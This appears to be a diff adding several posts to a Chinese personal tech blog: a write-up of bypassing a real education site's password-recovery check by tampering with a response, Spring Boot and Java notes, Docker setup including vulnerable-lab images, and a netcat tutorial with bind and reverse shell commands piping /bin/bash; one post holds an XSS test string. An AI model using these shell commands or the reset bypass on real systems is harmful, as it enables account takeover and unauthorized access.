@@ -138,6 +138,584 @@
           <div id="js-content" class="content-ll">
             
   
+    <article id="post-security/example/成都安全教育平台/chengdu.xueanquan.com" class="article article-type-post  article-index" itemscope itemprop="blogPost">
+  <div class="article-inner">
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2019/03/12/security/example/成都安全教育平台/chengdu.xueanquan.com/">成都安全教育平台修改密码</a>
+    </h1>
+  
+
+        
+        <a href="/2019/03/12/security/example/成都安全教育平台/chengdu.xueanquan.com/" class="archive-article-date">
+  	<time datetime="2019-03-12T07:54:01.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2019-03-12</time>
+</a>
+        
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h3 id="1-起因"><a href="#1-起因" class="headerlink" title="1.起因"></a>1.起因</h3><p>今天暂时写完了手上的后端接口，有点时间，想起前几天看见女朋友用的安全教育平台有个密码找回功能。<br><br>喜闻乐见，大家都知道这是个漏洞高发区。刚好去年看过几篇这方面的文章，一直没实践过，今天刚好练习下（我是未入门菜鸟）。</p>
+<h3 id="2-具体过程"><a href="#2-具体过程" class="headerlink" title="2.具体过程"></a>2.具体过程</h3><p>登录页面<br><br>看见这个已运行800天，心里就是一动，多半会成功了。<br><img src="./login.png" alt="登录"><br>密码找回页面<br><br>在这一步需要填一些信息<br><br>首先你要知道自己要改谁的密码，所以这一步的信息默认自己已知<br><img src="./password_back_1.png" alt="back_1"><br>密码找回页面2<br><br>要求在这里输入密保信息进行验证<br><br>由于不知道信息，所以想办法绕过<br><br>首先查看网页源代码，看看有没有逻辑漏洞<br><br><img src="./password_back_2.png" alt="back_2"><br>源代码<br><br>可以看到这里直接通过判断返回值中Result（boolean）来确定有没有验证成功，没有其它限制<br><br>所以首先想到通过拦截返回包，修改返回值<br><img src="./origin_code.png" alt="code"><br>返回包<br><br>将返回包中Result改为true，再发回页面<br><img src="./check.png" alt="check"><br>新密码<br><br>如图,成功跳转到修改密码界面<br><br><img src="./modify.png" alt="modify"></p>
+<p>实际修改密码时返回非法操作，观察发现需要传入一个DesSucuss字段，为48位hash,多次测试，该值不变<br><br>所以猜测为固定字段hash,暂未找到hash方式</p>
+
+      
+
+      
+    </div>
+    <div class="article-info article-info-index">
+      
+      
+	<div class="article-tag tagcloud">
+		<i class="icon-price-tags icon"></i>
+		<ul class="article-tag-list">
+			 
+        		<li class="article-tag-list-item">
+        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color4">security</a>
+        		</li>
+      		
+		</ul>
+	</div>
+
+      
+
+      
+        <p class="article-more-link">
+          <a class="article-more-a" href="/2019/03/12/security/example/成都安全教育平台/chengdu.xueanquan.com/">展开全文 >></a>
+        </p>
+      
+
+      
+      <div class="clearfix"></div>
+    </div>
+  </div>
+</article>
+
+<aside class="wrap-side-operation">
+    <div class="mod-side-operation">
+        
+        <div class="jump-container" id="js-jump-container" style="display:none;">
+            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
+                <i class="icon-font icon-back"></i>
+            </a>
+            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
+                <i class="icon-font icon-plane jump-plane"></i>
+            </div>
+        </div>
+        
+        
+    </div>
+</aside>
+
+
+
+
+  
+    <article id="post-java/springboot接收参数" class="article article-type-post  article-index" itemscope itemprop="blogPost">
+  <div class="article-inner">
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2019/02/22/java/springboot接收参数/">springboot Controller 接收参数</a>
+    </h1>
+  
+
+        
+        <a href="/2019/02/22/java/springboot接收参数/" class="archive-article-date">
+  	<time datetime="2019-02-22T02:34:34.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2019-02-22</time>
+</a>
+        
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h4 id="一-原因"><a href="#一-原因" class="headerlink" title="一.原因"></a>一.原因</h4><p>一直对springboot前后端交互的传参接参浑浑噩噩，准备仔细梳理一下。</p>
+<h4 id="二-常见注解"><a href="#二-常见注解" class="headerlink" title="二.常见注解"></a>二.常见注解</h4><h6 id="1-PathVariable"><a href="#1-PathVariable" class="headerlink" title="1.@PathVariable"></a>1.@PathVariable</h6><p>用于Get请求<br><br>获取请求url中的值，一般用来接收url/{param}类型的参数<br><br>一般返回类型为json或页面跳转等<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">//请求url: http://127.0.0.1:8080/get1/123</span><br><span class="line">@ResponseBody</span><br><span class="line">@RequestMapping(value = &quot;/get1/&#123;param&#125;&quot;,method = RequestMethod.GET)</span><br><span class="line">public String  get1(@PathVariable(&quot;param&quot;) String param)&#123;</span><br><span class="line">    System.out.println(param);</span><br><span class="line">    return param;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
+<h6 id="2-RequestParam"><a href="#2-RequestParam" class="headerlink" title="2.@RequestParam"></a>2.@RequestParam</h6><p>用于Get/Post都行<br><br>在get请求时  获取请求参数中的值<br><br>参数一般为url后面的param=param(&amp;xx=xx)或者form-data<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">//请求url: http://127.0.0.1:8080/get2?param1=param1&amp;param2=param2</span><br><span class="line">@ResponseBody</span><br><span class="line">    @RequestMapping(value = &quot;/get2&quot;, method = RequestMethod.GET)</span><br><span class="line">    public String get2(@RequestParam(&quot;param1&quot;) String param1,</span><br><span class="line">                       @RequestParam(&quot;param2&quot;) String param2)&#123;</span><br><span class="line">        return param1 + param2;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure></p>
+<h6 id="3-RequestBody"><a href="#3-RequestBody" class="headerlink" title="3.@RequestBody"></a>3.@RequestBody</h6><p>用于Get/Post都行<br><br>该注解和@RequestParam殊途同归，我们使用该注解将所有参数转换，在代码部分在一个个取出来，也是目前我使用到最多的注解来获取参数<br><br>@RequestBody注解常用来处理content-type不是默认的application/x-www-form-urlcoded编码的内容，比如说：application/json或者是application/xml等。一般情况下来说常用其来处理application/json类型<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">//请求url: http://127.0.0.1:8080/get3</span><br><span class="line">//参数为json: &#123;&quot;param1&quot;:&quot;11&quot;,&quot;param2&quot;: &quot;22&quot;&#125;</span><br><span class="line">@ResponseBody</span><br><span class="line">@RequestMapping(value = &quot;/get3&quot;, method = RequestMethod.GET)</span><br><span class="line">public String get3(@RequestBody Map&lt;String,String&gt; param)&#123;</span><br><span class="line">    return param.get(&quot;param1&quot;) + param.get(&quot;param2&quot;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
+<h6 id="4-HttpServletRequest"><a href="#4-HttpServletRequest" class="headerlink" title="4.HttpServletRequest"></a>4.HttpServletRequest</h6><p>get或post<br><br>适用于param=param(&amp;xx=xx)或者form-data<br><br>form-data会解析为param=param&amp;xx=xx形式<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">//请求参数为: http://127.0.0.1:8080/get4?param1=11&amp;param2=22</span><br><span class="line">//或参数为form-data</span><br><span class="line">@ResponseBody</span><br><span class="line">@RequestMapping(value = &quot;/get4&quot;, method = RequestMethod.GET)</span><br><span class="line">public String get4(HttpServletRequest request) &#123;</span><br><span class="line">    return request.getParameter(&quot;param1&quot;)+request.getParameter(&quot;param2&quot;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
+<h6 id="5-直接获取"><a href="#5-直接获取" class="headerlink" title="5.直接获取"></a>5.直接获取</h6><p>get请求<br><br>适用于param=param(&amp;xx=xx)或者form-data<br><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">@ResponseBody</span><br><span class="line">@RequestMapping(value = &quot;/get5&quot;, method = RequestMethod.GET)</span><br><span class="line">public String get4(String param1, String param2) &#123;</span><br><span class="line">    return param1+param2;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
+<p>######</p>
+
+      
+
+      
+    </div>
+    <div class="article-info article-info-index">
+      
+      
+	<div class="article-tag tagcloud">
+		<i class="icon-price-tags icon"></i>
+		<ul class="article-tag-list">
+			 
+        		<li class="article-tag-list-item">
+        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color5">java</a>
+        		</li>
+      		
+		</ul>
+	</div>
+
+      
+
+      
+        <p class="article-more-link">
+          <a class="article-more-a" href="/2019/02/22/java/springboot接收参数/">展开全文 >></a>
+        </p>
+      
+
+      
+      <div class="clearfix"></div>
+    </div>
+  </div>
+</article>
+
+<aside class="wrap-side-operation">
+    <div class="mod-side-operation">
+        
+        <div class="jump-container" id="js-jump-container" style="display:none;">
+            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
+                <i class="icon-font icon-back"></i>
+            </a>
+            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
+                <i class="icon-font icon-plane jump-plane"></i>
+            </div>
+        </div>
+        
+        
+    </div>
+</aside>
+
+
+
+
+  
+    <article id="post-tools/docker_vulner_install" class="article article-type-post  article-index" itemscope itemprop="blogPost">
+  <div class="article-inner">
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2019/02/14/tools/docker_vulner_install/">docker搭建漏洞环境</a>
+    </h1>
+  
+
+        
+        <a href="/2019/02/14/tools/docker_vulner_install/" class="archive-article-date">
+  	<time datetime="2019-02-14T03:53:54.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2019-02-14</time>
+</a>
+        
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h4 id="1-docker-compose"><a href="#1-docker-compose" class="headerlink" title="1.docker-compose"></a>1.docker-compose</h4><p>pip install docker-compose<br><br>Compose 项目是 Docker 官方的开源项目，负责实现对 Docker 容器集群的快速编排,负责快速的部署分布式应用。</p>
+<h4 id="2-git"><a href="#2-git" class="headerlink" title="2.git"></a>2.git</h4><p>git clone <a href="https://github.com/c0ny1/vulstudy.git" target="_blank" rel="noopener">https://github.com/c0ny1/vulstudy.git</a></p>
+<h4 id="3-start"><a href="#3-start" class="headerlink" title="3.start"></a>3.start</h4><h6 id="1-单独运行一个漏洞平台"><a href="#1-单独运行一个漏洞平台" class="headerlink" title="1.单独运行一个漏洞平台"></a>1.单独运行一个漏洞平台</h6><p>cd到要运行的漏洞平台下运行以下命令<br></p>
+<p>cd vulstudy/DVWA<br><br>docker-compose up -d #启动容器<br><br>docker-compose stop #停止容器<br></p>
+<h6 id="2-同时运行所有漏洞平台"><a href="#2-同时运行所有漏洞平台" class="headerlink" title="2.同时运行所有漏洞平台"></a>2.同时运行所有漏洞平台</h6><p>在项目根目录下运行以下命令<br></p>
+<p>cd vulstudy<br><br>docker-compose up -d #启动容器<br><br>docker-compose stop #停止容器<br></p>
+<h5 id="3-查看信息"><a href="#3-查看信息" class="headerlink" title="3.查看信息"></a>3.查看信息</h5><p>docker-compose ps 查看启动信息<br><br>docker-compose logs 查看日志<br><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">docker ps  </span><br><span class="line">sudo docker exec  -it 9a8(容器id前三位) /bin/sh&lt;br&gt;</span><br><span class="line">进入容器查看/修改</span><br></pre></td></tr></table></figure></p>
+
+      
+
+      
+    </div>
+    <div class="article-info article-info-index">
+      
+      
+	<div class="article-tag tagcloud">
+		<i class="icon-price-tags icon"></i>
+		<ul class="article-tag-list">
+			 
+        		<li class="article-tag-list-item">
+        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color2">docker</a>
+        		</li>
+      		
+		</ul>
+	</div>
+
+      
+
+      
+        <p class="article-more-link">
+          <a class="article-more-a" href="/2019/02/14/tools/docker_vulner_install/">展开全文 >></a>
+        </p>
+      
+
+      
+      <div class="clearfix"></div>
+    </div>
+  </div>
+</article>
+
+<aside class="wrap-side-operation">
+    <div class="mod-side-operation">
+        
+        <div class="jump-container" id="js-jump-container" style="display:none;">
+            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
+                <i class="icon-font icon-back"></i>
+            </a>
+            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
+                <i class="icon-font icon-plane jump-plane"></i>
+            </div>
+        </div>
+        
+        
+    </div>
+</aside>
+
+
+
+
+  
+    <article id="post-java/interface" class="article article-type-post  article-index" itemscope itemprop="blogPost">
+  <div class="article-inner">
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2019/01/21/java/interface/">接口</a>
+    </h1>
+  
+
+        
+        <a href="/2019/01/21/java/interface/" class="archive-article-date">
+  	<time datetime="2019-01-21T06:26:34.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2019-01-21</time>
+</a>
+        
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <p><a href="https://blog.csdn.net/u010466329/article/details/78133282" target="_blank" rel="noopener">接口与抽象类区别</a></p>
+<h3 id="一-例子"><a href="#一-例子" class="headerlink" title="一.例子"></a>一.例子</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line">package base.interfacedemo;</span><br><span class="line"></span><br><span class="line">//定义一个接口</span><br><span class="line">interface TestInterface &#123;</span><br><span class="line"></span><br><span class="line">    void test();</span><br><span class="line"></span><br><span class="line">    //接口静态内部类实现 默认 public static final</span><br><span class="line">    //方便扩展</span><br><span class="line">    TestInterface Demo1 = new TestInterface() &#123;</span><br><span class="line">        @Override</span><br><span class="line">        public void test() &#123;</span><br><span class="line">            System.out.println(&quot;test1&quot;);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;;</span><br><span class="line"></span><br><span class="line">    //default方法 java8新特性</span><br><span class="line">    default void Demo3()&#123;</span><br><span class="line">       System.out.println(&quot;test3&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">//正常的接口实现</span><br><span class="line">class Demo2 implements TestInterface&#123;</span><br><span class="line">    @Override</span><br><span class="line">    public void test()&#123;</span><br><span class="line">        System.out.println(&quot;test2&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">public class DemoInterface&#123;</span><br><span class="line"></span><br><span class="line">    public static void main(String[] args)&#123;</span><br><span class="line">        TestInterface.Demo1.test();</span><br><span class="line">        new Demo2().test();</span><br><span class="line">        Demo2 demo3 = new Demo2();</span><br><span class="line">        demo3.Demo3();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+      
+
+      
+    </div>
+    <div class="article-info article-info-index">
+      
+      
+	<div class="article-tag tagcloud">
+		<i class="icon-price-tags icon"></i>
+		<ul class="article-tag-list">
+			 
+        		<li class="article-tag-list-item">
+        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color5">java</a>
+        		</li>
+      		
+		</ul>
+	</div>
+
+      
+
+      
+        <p class="article-more-link">
+          <a class="article-more-a" href="/2019/01/21/java/interface/">展开全文 >></a>
+        </p>
+      
+
+      
+      <div class="clearfix"></div>
+    </div>
+  </div>
+</article>
+
+<aside class="wrap-side-operation">
+    <div class="mod-side-operation">
+        
+        <div class="jump-container" id="js-jump-container" style="display:none;">
+            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
+                <i class="icon-font icon-back"></i>
+            </a>
+            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
+                <i class="icon-font icon-plane jump-plane"></i>
+            </div>
+        </div>
+        
+        
+    </div>
+</aside>
+
+
+
+
+  
+    <article id="post-security/netcat" class="article article-type-post  article-index" itemscope itemprop="blogPost">
+  <div class="article-inner">
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2019/01/17/security/netcat/">netcat</a>
+    </h1>
+  
+
+        
+        <a href="/2019/01/17/security/netcat/" class="archive-article-date">
+  	<time datetime="2019-01-17T07:19:13.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2019-01-17</time>
+</a>
+        
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <p>netcat简称nc, 能通过tcp和udp在网络中读取数据。在两台电脑间建立连接，监听并返回两个数据流。</p>
+<h4 id="1-常用参数："><a href="#1-常用参数：" class="headerlink" title="1.常用参数："></a>1.常用参数：</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">-4/6 使用IPv4/6地址</span><br><span class="line">-b 允许broadcast广播</span><br><span class="line">-c  发送CRLF（回车换行 Carriage-Return Line-Feed）当line-ending</span><br><span class="line">-d 不尝试读取stdin</span><br><span class="line">-I length 设置TCP接收的buffer的大小</span><br><span class="line">-i interval 设置发送和接收间的延迟秒数，</span><br><span class="line">-l 监听模式</span><br><span class="line">-n 直接使用ip,不通过域名服务器DNS查询域名</span><br><span class="line">-o length  设置TCP发送的buffer大小</span><br><span class="line">-P 代理名字</span><br><span class="line">-p nc使用的端口</span><br><span class="line">-v verbose更多输出信息</span><br><span class="line">-w timeout</span><br><span class="line">-u 使用UDP</span><br><span class="line">-r 随机选择端口</span><br><span class="line">-s source  设置本地主机送出数据包的IP地址</span><br></pre></td></tr></table></figure>
+<h4 id="2-使用例子"><a href="#2-使用例子" class="headerlink" title="2.使用例子"></a>2.使用例子</h4><h5 id="1-建立连接，聊天"><a href="#1-建立连接，聊天" class="headerlink" title="1.建立连接，聊天"></a>1.建立连接，聊天</h5><pre><code>nc -l port 在本地主机监听一个端口&lt;br&gt;
+nc ip port 在其它主机与之建立连接（默认TCP），发送消息
+</code></pre><h5 id="2-端口扫描"><a href="#2-端口扫描" class="headerlink" title="2.端口扫描"></a>2.端口扫描</h5><pre><code>原理，进行tcp三次握手建立连接，如果成功则说明端口开放，容易被防火墙，IDS检测到&lt;br&gt;
+nc -v -n -z ip port(可以是范围)&lt;br&gt;
+    -v进行详细输出&lt;br&gt;
+    -n不进行域名查询&lt;br&gt;
+    -z建立连接后关闭连接，不进行数据交换&lt;br&gt;
+</code></pre><h5 id="3-数据传输-甚至可以传输流媒体）"><a href="#3-数据传输-甚至可以传输流媒体）" class="headerlink" title="3.数据传输(甚至可以传输流媒体）"></a>3.数据传输(甚至可以传输流媒体）</h5><pre><code>类似于聊天，只是将输入换成文件，使用重定向或者管道符&lt;br&gt;
+server:  nc -l port &lt; file1.txt&lt;br&gt;
+clien: nc -n ip port &gt; file2txt&lt;br&gt;
+file1往file2传数据&lt;br&gt;
+</code></pre><h5 id="4-获取shell，正反向shell"><a href="#4-获取shell，正反向shell" class="headerlink" title="4.获取shell，正反向shell"></a>4.获取shell，正反向shell</h5><pre><code>如果有-e参数，直接 nc ip port -e /bin/bash&lt;br&gt;
+无-e参数时:&lt;br&gt;
+server:&lt;br&gt;
+mkfifo /tmp/fifo&lt;br&gt;
+cat /tmp/fifo | /bin/bash -i 2&gt;&amp;1 | nc -l port &gt; /tmp/fifo&lt;br&gt;
+client:&lt;br&gt;
+nc ip port&lt;br&gt;
+原理：&lt;br&gt;
+bash -i 进入交互模式&lt;br&gt;
+通过mkfifo 建立一个管道（命令管道）文件，将管道文件的内容通过匿名管道传给/bin/bash执行，然后再将nc监听到的输入写入fifo,形成一个循环
+</code></pre><h5 id="5-端口转发"><a href="#5-端口转发" class="headerlink" title="5.端口转发"></a>5.端口转发</h5><pre><code>- 背景：192.168.1.103的msfadmin用户需要访问192.168.1.102的8000端口，但是该端口被防火墙保护着，不允许外界机器访问。目前msfadmin用户只能访问192.168.1.102的9000端口。需要9000端口做转发。
+- 目标：msfadmin通过访问192.168.1.102的9000端口，达到与8000端口通话的目的。
+原理：&lt;br&gt;
+在102上：nc -l 8000&lt;br&gt;
+              cat /tmp/fifo | nc localhost 8000 | nc -l 9000 &gt; /tmp/fifo
+在103上：&lt;br&gt;
+        nc 192.168.1.102 9000&lt;br&gt;
+在102主机上，开启要转发的8000端口，然后用9000端口通过接收数据，然后连接本地8000端口，将命令管道的数据通过匿名管道传给8000端口
+</code></pre>
+      
+
+      
+    </div>
+    <div class="article-info article-info-index">
+      
+      
+	<div class="article-tag tagcloud">
+		<i class="icon-price-tags icon"></i>
+		<ul class="article-tag-list">
+			 
+        		<li class="article-tag-list-item">
+        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color1">linux</a>
+        		</li>
+      		
+		</ul>
+	</div>
+
+      
+
+      
+        <p class="article-more-link">
+          <a class="article-more-a" href="/2019/01/17/security/netcat/">展开全文 >></a>
+        </p>
+      
+
+      
+      <div class="clearfix"></div>
+    </div>
+  </div>
+</article>
+
+<aside class="wrap-side-operation">
+    <div class="mod-side-operation">
+        
+        <div class="jump-container" id="js-jump-container" style="display:none;">
+            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
+                <i class="icon-font icon-back"></i>
+            </a>
+            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
+                <i class="icon-font icon-plane jump-plane"></i>
+            </div>
+        </div>
+        
+        
+    </div>
+</aside>
+
+
+
+
+  
+    <article id="post-tools/docker" class="article article-type-post  article-index" itemscope itemprop="blogPost">
+  <div class="article-inner">
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2019/01/16/tools/docker/">docker</a>
+    </h1>
+  
+
+        
+        <a href="/2019/01/16/tools/docker/" class="archive-article-date">
+  	<time datetime="2019-01-16T09:25:54.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2019-01-16</time>
+</a>
+        
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <p>docker的本意是希望容器是无状态的，即箱子有什么就用什么，我们外部不做修改，如果我需要改代码则重新build一个image出来。<br><br>镜像与容器，我的理解是将自己的程序做成镜像，放到容器中运行，容器提供运行环境。</p>
+<h4 id="一-install"><a href="#一-install" class="headerlink" title="一.install"></a>一.install</h4><p>ubuntu 16.04 LTS<br></p>
+<h5 id="1-sudo-apt-install-docker-io"><a href="#1-sudo-apt-install-docker-io" class="headerlink" title="1.sudo apt install docker.io"></a>1.sudo apt install docker.io</h5><h5 id="2-阿里镜像加速"><a href="#2-阿里镜像加速" class="headerlink" title="2.阿里镜像加速"></a>2.阿里镜像加速</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">sudo mkdir -p /etc/docker</span><br><span class="line">sudo tee /etc/docker/daemon.json &lt;&lt;-&apos;EOF&apos;</span><br><span class="line">&#123;</span><br><span class="line">  &quot;registry-mirrors&quot;: [&quot;https://etuznpiq.mirror.aliyuncs.com&quot;]</span><br><span class="line">&#125;</span><br><span class="line">EOF</span><br><span class="line">sudo systemctl daemon-reload</span><br><span class="line">sudo systemctl restart docker</span><br></pre></td></tr></table></figure>
+<p>保存为sh,执行</p>
+<h5 id="3-重启"><a href="#3-重启" class="headerlink" title="3.重启"></a>3.重启</h5><p>servie docker restart</p>
+<h5 id="4-登录"><a href="#4-登录" class="headerlink" title="4.登录"></a>4.登录</h5><p>sudo docker login –username=17888824094 registry.cn-hangzhou.aliyuncs.com</p>
+<h5 id="5-拉取远程镜像"><a href="#5-拉取远程镜像" class="headerlink" title="5.拉取远程镜像"></a>5.拉取远程镜像</h5><p>sudo docker pull microsoft/aci-helloworld</p>
+<h5 id="6-启动"><a href="#6-启动" class="headerlink" title="6.启动"></a>6.启动</h5><p>这是启动镜像<br><br>docker run  镜像 (-d deamon模式)<br><br>例: docker run -d -p 8888:80 microsoft/aci-helloworld<br><br>-p：物理机端口，要转发的端口，可以多个端口 -p 8888:8888 8889:8889 3000:3000<br><br>目录挂载:-v $PWD/www:/www  将主机中当前目录下的www挂载到容器的/www</p>
+<h5 id="7-查看"><a href="#7-查看" class="headerlink" title="7.查看"></a>7.查看</h5><p>docker ps 查看容器信息<br><br>docker logs 容器id   查看容器内日志</p>
+<h5 id="8-关闭"><a href="#8-关闭" class="headerlink" title="8.关闭"></a>8.关闭</h5><p>这是操作的容器<br><br>docker stop 容器id<br><br>docker ps -a  查看关闭的容器<br><br>docker restart 容器id    重启容器<br><br>docker rm 容器id  删除容器</p>
+<h5 id="9-进入container"><a href="#9-进入container" class="headerlink" title="9.进入container"></a>9.进入container</h5><p>sudo docker exec  -it 9a8(容器id前三位) /bin/sh<br><br>交互模式， /bin/sh为要使用的$PATH,进入容器内进行操作</p>
+<h5 id="10-保存对容器的修改"><a href="#10-保存对容器的修改" class="headerlink" title="10.保存对容器的修改"></a>10.保存对容器的修改</h5><p>对容器的修改默认是保存的<br><br>docker commit 698 name(生成一个新的版本名)</p>
+<h5 id="11-生成自己的image"><a href="#11-生成自己的image" class="headerlink" title="11.生成自己的image"></a>11.生成自己的image</h5><p>&lt;scr<script>ipt&gt;alert(“XSS”);&lt;/scr<script>ipt&gt;</p>
+</script></p>
+      
+
+      
+    </div>
+    <div class="article-info article-info-index">
+      
+      
+	<div class="article-tag tagcloud">
+		<i class="icon-price-tags icon"></i>
+		<ul class="article-tag-list">
+			 
+        		<li class="article-tag-list-item">
+        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color1">tools</a>
+        		</li>
+      		 
+        		<li class="article-tag-list-item">
+        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color2">docker</a>
+        		</li>
+      		
+		</ul>
+	</div>
+
+      
+
+      
+        <p class="article-more-link">
+          <a class="article-more-a" href="/2019/01/16/tools/docker/">展开全文 >></a>
+        </p>
+      
+
+      
+      <div class="clearfix"></div>
+    </div>
+  </div>
+</article>
+
+<aside class="wrap-side-operation">
+    <div class="mod-side-operation">
+        
+        <div class="jump-container" id="js-jump-container" style="display:none;">
+            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
+                <i class="icon-font icon-back"></i>
+            </a>
+            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
+                <i class="icon-font icon-plane jump-plane"></i>
+            </div>
+        </div>
+        
+        
+    </div>
+</aside>
+
+
+
+
+  
+    <article id="post-tools/vim" class="article article-type-post  article-index" itemscope itemprop="blogPost">
+  <div class="article-inner">
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2019/01/16/tools/vim/">vim</a>
+    </h1>
+  
+
+        
+        <a href="/2019/01/16/tools/vim/" class="archive-article-date">
+  	<time datetime="2019-01-16T06:10:33.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2019-01-16</time>
+</a>
+        
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h3 id="1"><a href="#1" class="headerlink" title="1"></a>1</h3>
+      
+
+      
+    </div>
+    <div class="article-info article-info-index">
+      
+      
+	<div class="article-tag tagcloud">
+		<i class="icon-price-tags icon"></i>
+		<ul class="article-tag-list">
+			 
+        		<li class="article-tag-list-item">
+        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color1">tools</a>
+        		</li>
+      		
+		</ul>
+	</div>
+
+      
+
+      
+        <p class="article-more-link">
+          <a class="article-more-a" href="/2019/01/16/tools/vim/">展开全文 >></a>
+        </p>
+      
+
+      
+      <div class="clearfix"></div>
+    </div>
+  </div>
+</article>
+
+<aside class="wrap-side-operation">
+    <div class="mod-side-operation">
+        
+        <div class="jump-container" id="js-jump-container" style="display:none;">
+            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
+                <i class="icon-font icon-back"></i>
+            </a>
+            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
+                <i class="icon-font icon-plane jump-plane"></i>
+            </div>
+        </div>
+        
+        
+    </div>
+</aside>
+
+
+
+
